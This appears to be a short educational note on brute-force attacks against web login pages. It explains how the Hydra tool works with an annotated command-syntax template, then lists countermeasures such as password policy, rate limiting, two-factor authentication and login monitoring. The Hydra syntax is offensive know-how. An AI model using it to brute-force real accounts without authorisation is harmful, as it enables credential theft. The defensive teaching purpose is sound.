Brute force attack on login page

Brute forcing is one of the most common methods attackers use to get user credentials.
With this method a user password can be stolen by simply trying out as many different passwords
as possible until a login was successfuly.
There are many tools for this attack one of which is called "Hydra".

command structure:
		hydra
		[-l LOGIN|-L FILE] #login name or list
		[-p PASS|-P FILE] #password or list
		[-u] #every user
		[-f] #stop on first match
		[IP] #IP of target website
		[-s PORT] #target port
		[MODULE] #module selection (HTTP/SSH/RDP/etc...)
		[url]:[form params]:[condition string] #module settings

How to counter brute force attacks:
	1.	Introduce a strong password policy
		-	a password should contain at least...
			-	8 characters
			-	1 digit
			-	1 special character
			-	1 lowercase character
			-	1 uppercase character
		-	and the password should not contain the users name
	2.	Implement rate limiting
		-	Limit the number of login attempts that a user
			can make within a specific time frame.
			If a user exceeds the limit, their IP address can
			be temporarily blocked or the account can be locked.
		-	add captchas
	3.	Use two factor authentication
		-	2FA adds an extra security layer by sending a
			one time password to the users e-mail or phone.
	4.	Monitor user logins
		-	Regularly monitor login logs for any suspicious activity,
			such as repeated failed login attempts from the same IP address.
			This can help you to quickly detect and respond
			to potential brute force attacks.
	5.	Biometrics
		-	use fingerprints to identify the user
